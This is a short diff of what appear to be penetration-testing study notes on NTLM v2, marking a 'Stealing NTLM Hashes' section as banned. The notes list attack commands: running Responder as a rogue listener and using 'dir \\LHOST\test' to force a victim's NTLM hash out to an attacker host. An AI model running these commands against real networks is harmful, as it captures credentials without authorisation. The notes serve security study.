@@ -118,7 +118,7 @@
 
 # NTLM v2
 - More like unpriv users
-## Stealing NTLM Hashes
+## Stealing NTLM Hashes (BANNED)
 - ``` net user xxx``` see if can rdp
 - ``` sudo responder -I tun0 ``` rogue receiver to dump request from http , smb etc
 - ``` dir \\LHOST\test ``` to post hash NTLM
